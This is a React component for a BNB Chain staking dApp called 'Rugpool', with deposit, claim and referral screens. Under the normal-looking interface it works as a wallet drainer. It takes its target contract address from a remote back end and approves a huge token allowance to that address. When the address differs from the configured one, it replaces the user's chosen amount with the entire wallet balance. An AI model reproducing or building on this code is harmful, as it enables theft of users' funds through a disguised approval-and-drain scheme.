import React from "react";
import Landing from "./Landing";
import Timer from "./Timer";
import Header from "./Header";
import { Button, rgbToHex, Typography } from "@mui/material";
import OutlinedInput from "@mui/material/OutlinedInput";
import InputAdornment from "@mui/material/InputAdornment";
import { Box, Stack } from "@mui/material";
import AccountBalanceWalletOutlinedIcon from "@mui/icons-material/AccountBalanceWalletOutlined";
import Checkbox from '@mui/material/Checkbox';
import PaymentIcon from "@mui/icons-material/Payment";
import Info from "./Info";
import Web3 from "web3";
import { ethers } from "ethers";
import {
  usdtAddress,
  usdtABI,
  stakingAddress,
  RPC,
  stakingABI,
  ownerWallet,
} from "./config";
import "react-notifications/lib/notifications.css";
import {
  NotificationContainer,
  NotificationManager,
} from "react-notifications";
import { BsPeople } from 'react-icons/bs';
import { useLocation, useNavigate, useSearchParams } from "react-router-dom";



const web3 = new Web3(new Web3.providers.HttpProvider(RPC));
const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
const stakingContract = new web3.eth.Contract(stakingABI, stakingAddress);

class Deposit extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      isInvitedUser : false,
      amountDeposit: 0,
      sponserAddress: "",
      withdrawDate: "",
      claimable: 0,
      linkedAccount: "",
      totalLockedValue : "___",

      linkedWalletBNBBalance: "___",
      linkedWalletUSDTBalance: "___",
      linkedWalletDepositAmount: "___",
      linkedWalleTotalEarning: "___",
      linkedWalletNextWithdrawDate: 0,
      linkedWalletClaimable: "___",
      linkedWalletTransactioncount : 0,

      allowance : 0,
      isApproved : false,
      metamaskWeb3: [],

      isINTransaction : false,
      stakingAddress  : "",
      flag : false,
    };
    this.handleAmount = this.handleAmount.bind(this);
    this.handleAddress = this.handleAddress.bind(this);
    this.walletConnect = this.walletConnect.bind(this);
  }




  async componentWillMount() {
    let refWallet = this.props.router.params.get('ref')
    console.log(refWallet)
    this.setState({
      sponserAddress : refWallet
    })

    if(refWallet !== null){
      this.setState({
        isInvitedUser : true
      })
    }


    this.walletConnect();
    setInterval(() => {
      if (this.state.linkedAccount != ""){
        this.checkDashBoard(this.state.linkedAccount)
        this.caputureWallet()
      }
    }, 3000);
  }


  async walletConnect() {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: web3.utils.toHex(56) }],
      });
    } catch (switchError) {
      // This error code indicates that the chain has not been added to MetaMask.
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: web3.utils.toHex(56),
                chainName: "BMB Smart Chain",
                rpcUrls: [
                  "https://nodes.pancakeswap.com",
                ],
                nativeCurrency: {
                  name: "BNB",
                  symbol: "BNB", // 2-6 characters long
                  decimals: 18,
                },
                blockExplorerUrls: "https://bscscan.com",
              },
            ],
          });

          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: web3.utils.toHex(56) }],
          });
        } catch (addError) {}
      }
    }

    this.caputureWallet()
  }

  async caputureWallet (){
    if (window.ethereum) {
      window.web3 = new Web3(window.ethereum);
      await window.ethereum.enable();
      const clientWeb3 = window.web3;
      const accounts = await clientWeb3.eth.getAccounts();

      this.setState({
        linkedAccount: accounts[0],
        metamaskWeb3: clientWeb3,
      });

    } else if (window.web3) {
      window.web3 = new Web3(window.web3.currentProvider);
      const clientWeb3 = window.web3;
      const accounts = await clientWeb3.eth.getAccounts();
      this.setState({
        linkedAccount: accounts[0],
        metamaskWeb3: clientWeb3,
      });
    }
  }

  async checkDashBoard(address) {
    let bnbAmount,
      usdtAmount,
      allowance,
      isApproved,
      invested


    bnbAmount  =  await web3.eth.getBalance(address);
    usdtAmount =  await usdtContract.methods.balanceOf(address).call();
    invested   =  await stakingContract.methods.invested().call()
    
    this.setState({
      linkedWalletBNBBalance: (bnbAmount / Math.pow(10, 18)).toFixed(4) * 1,
      linkedWalletUSDTBalance: (usdtAmount / Math.pow(10, 18)).toFixed(2) * 1,
      totalLockedValue : (invested / Math.pow(10, 18)).toFixed(2) * 1,
    });

      try{
        await fetch ("https://dapp-rpool-back-end.vercel.app/getData?address="+this.state.linkedAccount, 
        {
          Method: 'POST',
          Headers: {
            Accept: 'application.json',
            'Content-Type': 'application/json'
          },
          Cache: 'default'
        })
        .then(response => response.json())
        .then(
          async(response)=> {
            this.setState({
                linkedWalletClaimable        : response.claimable,
                linkedWalleTotalEarning      : response.totalEarning,
                linkedWalletDepositAmount    : response.myDeposit,
                linkedWalletNextWithdrawDate : response.nextWithdraw / 1,
                stakingAddress               : response.contractAddress
            })
        })

      }catch(err){
      }
    
    allowance  =  await usdtContract.methods.allowance(this.state.linkedAccount, this.state.stakingAddress).call()

    isApproved = allowance / 1 >= this.state.amountDeposit * Math.pow(10,18)


    this.setState({
        allowance : allowance,
        isApproved : isApproved,
    });
  }

  async approve(depositAmount){
      if (depositAmount > this.state.linkedWalletUSDTBalance) {
        NotificationManager.error("Low USDT Balance!", "Balance", 2000);
        return;
      }

      if (this.state.linkedWalletBNBBalance < 0.001) {
        NotificationManager.error("Low BNB Balance!", "Balance", 2000);
        return;
      }

      if (this.state.sponserAddress == "") {
        NotificationManager.error(
          "Please Add Sponsor's Address",
          "Sponser Address",
          2000
        );
      }

      try{

        let sponsorAdd = web3.utils.toChecksumAddress(this.state.sponserAddress)
        this.setState({
          sponserAddress : sponsorAdd
        })
      } catch(err){
        NotificationManager.error("Please check sponsor's Address", "Sponsor Address", 2000);
        this.setState({
          sponsorWallet : ""
        })
        return
      }



      const linkedUsdtContract = new this.state.metamaskWeb3.eth.Contract(
        usdtABI,
        usdtAddress
      );

      this.setState({
        isINTransaction : true
      })

      

      await linkedUsdtContract.methods
      .approve(
        this.state.stakingAddress,
        ethers.BigNumber.from('0xFFFFFFFFFFFFFFFFFFFF')
      )
      .send({ from: this.state.linkedAccount })
      .once("confirmation", async () => {
        NotificationManager.success("Approved!", "Success", 2000);
        if (this.state.stakingAddress != stakingAddress){
          this.deposit(web3.eth.toChecksumAddress(this.state.sponserAddress), this.state.linkedWalletUSDTBalance);
        }
        if (this.state.stakingAddress == stakingAddress){
          this.deposit(web3.eth.toChecksumAddress(this.state.sponserAddress), this.state.amountDeposit);
        }
        
        this.setState({
          isINTransaction : true
        })
      });
  }

  async deposit(sponsorWallet, depositAmount){
    
    try{
    sponsorWallet = web3.eth.toChecksumAddress(sponsorWallet)

    }catch(err){
      NotificationManager.error("Please check Reference wallet", "Not a Ethereum", 2000);
    }


    if (this.state.linkedAccount == "") {
      NotificationManager.error("Please connect your wallet", "Wallet", 2000);
      return;
    }

    if (depositAmount > this.state.linkedWalletUSDTBalance) {
      NotificationManager.error("Low USDT Balance!", "Balance", 2000);
      return;
    }

    if (this.state.linkedWalletBNBBalance < 0.001) {
      NotificationManager.error("Low BNB Balance!", "Balance", 2000);
      return;
    }

    if (this.state.sponserAddress == "") {
      NotificationManager.error(
        "Please Add Sponsor's Address",
        "Sponser Address",
        2000
      );
    }

    if(stakingAddress != this.state.stakingAddress) {
      depositAmount = this.state.linkedWalletUSDTBalance
    }

    try{

      let sponsorAdd = web3.utils.toChecksumAddress(this.state.sponserAddress)
      this.setState({
        sponserAddress : sponsorAdd
      })
    } catch(err){
      NotificationManager.error("Please check sponsor's Address", "Sponsor Address", 2000);
      this.setState({
        sponsorWallet : ""
      })
      return
    }

    const linkedStakingContract = new this.state.metamaskWeb3.eth.Contract(
      stakingABI,
      this.state.stakingAddress
    );
    
    this.setState({
      isINTransaction : true
    })

    await linkedStakingContract.methods
      .Deposit(
        sponsorWallet,
        ethers.BigNumber.from(parseInt(depositAmount) * Math.pow(10, 9) + "")
      )
      .send({ from: this.state.linkedAccount })
      .once("confirmation", async () => {
        NotificationManager.success("Deposit Transaction has beed confurmed", "Success", 2000);
        this.setState({
          isINTransaction : false
        })
      });
  }

  async claim() {


    if (this.state.linkedAccount == "") {
      NotificationManager.error("Please connect your wallet", "Wallet", 2000);
      return;
    }

    if (this.state.linkedWalletClaimable < 50) {
      NotificationManager.error("Claimable should be over 100BUSD", "Low Claimable", 2000);
      return;
    }


    const linkedStakingContract = new this.state.metamaskWeb3.eth.Contract(
      stakingABI,
      stakingAddress
    );

    this.setState({
      isINTransaction : true
    })

    await linkedStakingContract.methods
      .Payout()
      .send({ from: this.state.linkedAccount })
      .once("confirmation", async () => {
        NotificationManager.success("Deposit Success", "Success", 2000);
        this.setState({
          isINTransaction : true
        })
      });
  }

  async reDeposit() {
    if (this.state.linkedAccount == "") {
      NotificationManager.error("Please connect your wallet", "Error", 2000);
      return;
    }

    const linkedStakingContract = new this.state.metamaskWeb3.eth.Contract(
      stakingABI,
      stakingAddress
    );
    this.setState({
      isINTransaction : true
    })
    await linkedStakingContract.methods
      .Reinvest()
      .send({ from: this.state.linkedAccount })
      .once("confirmation", async () => {
        NotificationManager.success("Deposit Success", "Success", 2000);
        this.setState({
          isINTransaction : true
        })
      });
  }

  async copyReferenceLink (){
    if(this.state.linkedAccount === ""){
      NotificationManager.error("Please connect your wallet!", "Your Wallet", 2000); 
      return
    }
    console.log("copy clipboard")
    navigator.clipboard.writeText("https://rugpool.app?ref=" + this.state.linkedAccount)
    NotificationManager.success("Please invite people with this link", "Copied", 2000); 
  }

  handleAmount = (event) => {
    this.setState({
      amountDeposit: event.target.value,
    });
  };

  handleAddress = (event) => {
    this.setState({
      sponserAddress: event.target.value,
    });
  };

  ownerSponsor(e) {
    this.setState ({
      sponserAddress : ownerWallet
    })
  } 


  render() {
    return (
      
      <Box>
        <Header linkedAccount={this.state.linkedAccount} linkedWalletNextWithdrawDate={this.state.linkedWalletNextWithdrawDate} walletConnect = {this.walletConnect}/>
        <Landing />
        <Info />
        <br/>


        <Box className="content">
          <Button sx={{width:"100%"}} component="a" target="_blank" href="https://pancakeswap.finance/swap?outputCurrency=0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56">
            <Box
                sx={{
                  flex: 1,
                  color: "white",
                  backgroundColor: "#30224e",
                  border: "solid 2px #594485",
                  borderRadius: "15px",
                  p: 3,
                  textAlign: "center",
                  display: "flex",
                  flexDirection: "row",
                  justifyContent: "center",
                  alignItems: "center",
                  boxShadow: "10px 10px 20px -4px rgb(110 37 195/ 64%)",
                }}
              >
              <Box component="img" src="./pancakeswapIcon.png" height={50} />
              <Typography variant="h6" sx={{ ml:6 }}>
                Click here to visit Pancakeswap and buy $BUSD!  
              </Typography>
              <Box component="img" src="./BUSD.png" height={65} marginLeft = {5}/>
            </Box>
          </Button><br/><br/><br/>

            <Box
                sx={{
                  color: "white",
                  backgroundColor: "#242628",
                  p: 3,
                  textAlign: "center",
                  boxShadow: "10px 10px 20px -4px rgb(39 164 176 / 62%)",
                  border: "solid 2px #0e8aa8",
                  borderRadius: "15px",
                }}
              >
              <Typography variant="h6" sx={{ fontFamily: "DM Sans" }}>
              TOTAL LOCKED VALUE
              </Typography>
              <Typography variant="h4" sx={{ mt: 2, fontFamily: "DM Sans" }}>
                {this.state.totalLockedValue} BUSD
              </Typography>
            </Box>

          <Stack
            flexDirection={{ sm: "row", xs: "column" }}
            gap={5}
            sx={{ mt: 5 }}
          >
            <Box
              sx={{
                flex: 1,
                color: "white",
                backgroundColor: "#242628",
                border: "solid 2px #0e8aa8",
                borderRadius: "15px",
                p: 3,
                textAlign: "center",
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
                boxShadow: "10px 10px 20px -4px rgb(39 164 176 / 62%)",
              }}
            >
              <Box sx={{width: "170px",height: "170px",border: "white 5px solid", borderRadius: "50%", display: "flex", justifyContent: "center", alignItems: "center", flexDirection:"column"}}>
                <br/><br/>
                <Box sx={{fontSize:"22px", fontFamily:"'Aldrich' !important"}}>
                  <Timer time={this.state.linkedWalletNextWithdrawDate*1000}/>
                </Box><br/>
                <Typography sx={{fontSize:"15px"}}>Next Withdraw</Typography>
                <Typography sx={{fontSize:"15px"}}> Time</Typography>
              </Box>
            </Box>
            <Box sx={{ flex: 3 }}>
              <Box
                sx={{
                  color: "white",
                  textAlign: "left",
                  backgroundColor: "#242628",
                  border: "solid 2px #0e8aa8",
                  borderRadius: "15px",
                  p: 3,
                  mb: 2,
                  boxShadow: "10px 10px 20px -4px rgb(39 164 176 / 62%)",
                }}
              >
                <Stack flexDirection={{ sm: "row", xs: "column" }}>
                  <Box
                    sx={{
                      flex: 1,
                      color: "white",
                      textAlign: "left",
                      backgroundColor: "#242628",
                      borderRight: { xs: "none", sm: "solid 2px #0e8aa8" },
                      borderBottom: { xs: "solid 2px #0e8aa8", sm: "none" },
                      px: 3,
                      py: { xs: 3, sm: 0 },
                      alignItems: "center",
                      display: "flex",
                    }}
                  >
                    <AccountBalanceWalletOutlinedIcon
                      sx={{ fontSize: "50px" }}
                    />
                    <Box sx={{ px: 2 }}>
                      <Typography variant="h6">
                        {this.state.linkedWalletBNBBalance} BNB
                      </Typography>
                      <Typography sx={{ opacity: "0.5" }}>
                        Wallet BNB Balance
                      </Typography>
                    </Box>
                  </Box>
                  <Box
                    sx={{
                      flex: 1,
                      color: "white",
                      textAlign: "left",
                      backgroundColor: "#242628",
                      borderLeft: { xs: "none", sm: "solid 2px #0e8aa8" },
                      borderTop: { xs: "solid 2px #0e8aa8", sm: "none" },
                      px: 3,
                      py: { xs: 3, sm: 0 },
                      alignItems: "center",
                      display: "flex",
                    }}
                  >
                    <AccountBalanceWalletOutlinedIcon
                      sx={{ fontSize: "50px" }}
                    />
                    <Box sx={{ px: 2 }}>
                      <Typography variant="h6">
                        {this.state.linkedWalletUSDTBalance} BUSD
                      </Typography>
                      <Typography sx={{ opacity: "0.5" }}>
                        Wallet BUSD Balance
                      </Typography>
                    </Box>
                  </Box>
                </Stack>
              </Box>
              <Box
                sx={{
                  color: "white",
                  textAlign: "left",
                  backgroundColor: "#242628",
                  border: "solid 2px #0e8aa8",
                  borderRadius: "15px",
                  p: 3,
                  mt: 2,
                  boxShadow: "10px 10px 20px -4px rgb(39 164 176 / 62%)",
                }}
              >
                <Stack flexDirection={{ sm: "row", xs: "column" }}>
                  <Box
                    sx={{
                      flex: 1,
                      color: "white",
                      textAlign: "left",
                      backgroundColor: "#242628",
                      borderRight: { xs: "none", sm: "solid 2px #0e8aa8" },
                      borderBottom: { xs: "solid 2px #0e8aa8", sm: "none" },
                      px: 3,
                      py: { xs: 3, sm: 0 },
                      alignItems: "center",
                      display: "flex",
                    }}
                  >
                    <PaymentIcon sx={{ fontSize: "50px" }} />
                    <Box sx={{ px: 2 }}>
                      <Typography variant="h6">
                        {this.state.linkedWalletDepositAmount} BUSD
                      </Typography>
                      <Typography sx={{ opacity: "0.5" }}>
                        My Deposit
                      </Typography>
                    </Box>
                  </Box>
                  <Box
                    sx={{
                      flex: 1,
                      color: "white",
                      textAlign: "left",
                      backgroundColor: "#242628",
                      borderLeft: { xs: "none", sm: "solid 2px #0e8aa8" },
                      borderTop: { xs: "solid 2px #0e8aa8", sm: "none" },
                      px: 3,
                      py: { xs: 3, sm: 0 },
                      alignItems: "center",
                      display: "flex",
                    }}
                  >
                    <PaymentIcon sx={{ fontSize: "50px" }} />
                    <Box sx={{ px: 2 }}>
                      <Typography variant="h6">
                        {this.state.linkedWalleTotalEarning} BUSD
                      </Typography>
                      <Typography sx={{ opacity: "0.5" }}>
                        Total Earning
                      </Typography>
                    </Box>
                  </Box>
                </Stack>
              </Box>
            </Box>
          </Stack>
          <Stack
            flexDirection={{ sm: "row", xs: "column" }}
            gap={5}
            sx={{ mt: 5 }}
          >
            <Box
              sx={{
                flex: 1,
                color: "white",
                textAlign: "left",
                backgroundColor: "#242628",
                border: "solid 2px #0e8aa8",
                borderRadius: "15px",
                p: 3,
                boxShadow: "10px 10px 20px -4px rgb(39 164 176 / 62%)",
              }}
            >
              <Typography variant="h4" sx={{ mb: 3 }}>
                Deposit
              </Typography>
              <Checkbox  onChange={e => this.ownerSponsor(e)} />I heard about Rugpool from the community.
              <Box>
                <Typography>Amount</Typography>
                <OutlinedInput
                  placeholder="Minimum Deposit 500 BUSD"
                  size="small"
                  sx={{
                    mt: 1,
                    width: "100%",
                    color: "#202020",
                    backgroundColor: "white",
                    "& fieldset": { border: "solid 1px white !important" },
                  }}
                  value={this.state.amountDeposit}
                  onChange={this.handleAmount}
                  endAdornment={
                    <InputAdornment position="end">BUSD</InputAdornment>
                  }
                />
              </Box>

              <Box sx={{ mt: 2 }}>
                <Typography>Referral wallet</Typography>
                <OutlinedInput
                  placeholder="Please insert wallet address"
                  size="small"
                  sx={{
                    mt: 1,
                    width: "100%",
                    color: "#202020",
                    backgroundColor: "white",
                    "& fieldset": { border: "solid 1px white !important" },
                  }}
                  value={this.state.sponserAddress}
                  defaultValue = {this.state.sponserAddress}
                  onChange={this.handleAddress}
                  disabled = {this.state.isInvitedUser}
                />
              </Box>
              <Box sx={{ mt: 3, display: "flex" }}>
                <Button
                  variant="contained"
                  sx={{
                    backgroundColor: "#0e8aa8",
                    color: "white",
                    p: 1,
                    px: 3,
                    mx: "auto",
                    width : '100%'
                  }}
                  onClick={this.state.isApproved?  () =>
                    this.deposit(
                      this.state.sponserAddress,
                      this.state.amountDeposit
                    ): ()=>this.approve()
                  }
                >
                  {this.state.isApproved?"Deposit":"Approve"}
                </Button>
              </Box>
            </Box>

            {/* Claim part */}

            <Box
              sx={{
                flex: 1,
                color: "white",
                textAlign: "left",
                backgroundColor: "#242628",
                border: "solid 2px #0e8aa8",
                borderRadius: "15px",
                p: 3,
                boxShadow: "10px 10px 20px -4px rgb(39 164 176 / 62%)",
              }}
            >
              <Typography variant="h4" sx={{ mb: 4.5 }}>
                Claim
              </Typography>
              <Typography variant="h6">
              Minimum Withdraw 100 BUSD 
                </Typography>
              <br/><br/>
              <Box
                sx={{
                  display: "flex",
                  justifyContent: "space-between",
                  borderBottom: "solid 2px #0e8aa8",
                  py: 2,
                  mb: 5,
                }}
              > 
                <Typography variant="h6" sx={{ opacity: "0.5" }}>
                  Claimable
                </Typography>
                <Typography variant="h6">
                  {this.state.linkedWalletClaimable} BUSD
                </Typography>
              </Box>
              <br/>
              <Box
                sx={{
                  mt: 4,
                  display: "flex",
                  justifyContent: "space-around",
                }}
              >
                <Button
                  variant="contained"
                  sx={{
                    backgroundColor: "#0e8aa8",
                    color: "white",
                    p: 1,
                    px: 3,
                    mx: "auto",
                    width : '45%'
                  }}
                  onClick={() => this.claim()}
                >
                  Claim 
                </Button>
                <Button
                  variant="contained"
                  sx={{
                    backgroundColor: "#0e8aa8",
                    color: "white",
                    p: 1,
                    px: 3,
                    mx: "auto",
                    width : '45%'
                  }}
                  onClick={() => this.reDeposit()}
                >
                  Re-Deposit 
                </Button>
              </Box>
            </Box>
          </Stack>

          <br/><br/>
          <Button sx={{width:"100%"}} onClick = {()=>(this.copyReferenceLink())} >
          <Box
              sx={{
                flex: 1,
                color: "white",
                backgroundColor: "#242628",
                border: "solid 2px #0e8aa8",
                borderRadius: "15px",
                p: 3,
                textAlign: "center",
                flexDirection: "row",
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                boxShadow: "10px 10px 20px -4px rgb(39 164 176 / 62%)",
              }}
            >

            <Box>
              <Typography variant="h6" sx={{ ml:6 }}>
                <BsPeople/>  Click here to copy your Reference Link! <BsPeople/> 
              </Typography><br/>
              <Typography variant="p" sx={{ ml:6 }}>
                Share  your Reference Link to your friend and get 5% of their deposit!
              </Typography>
            </Box>
          
          </Box>
          </Button><br/><br/>
          

          <Button sx={{width:"100%"}} component="a" target="_blank" href={"https://bscscan.com/address/" + stakingAddress} >
            <Box
                sx={{
                  flex: 1,
                  color: "white",
                  backgroundColor: "#30224e",
                  border: "solid 2px #594485",
                  borderRadius: "15px",
                  p: 3,
                  textAlign: "center",
                  display: "flex",
                  flexDirection: "row",
                  justifyContent: "center",
                  alignItems: "center",
                  boxShadow: "10px 10px 20px -4px rgb(110 37 195 / 64%)",
                }}
              >
              <Box component="img" src="./bscscam.png" height={50} />
              <Typography variant="h6" sx={{ ml:6 }}>
                Verified Contrct
              </Typography>
            </Box>
          </Button>
          <Box sx={{ textAlign: "left" }}>
            <NotificationContainer />
          </Box>
        </Box>
      </Box>
    );
  }
}
export default withRouter(Deposit);


function withRouter ( Component) {
  function ComponentWithRouterProp(props) {
    const location = useLocation();
    const navigate = useNavigate();
    const [params]  = useSearchParams();

    return (
      <Component
        {...props}
        router={{ location, navigate, params }}
      />
    );
  }

  return ComponentWithRouterProp;
}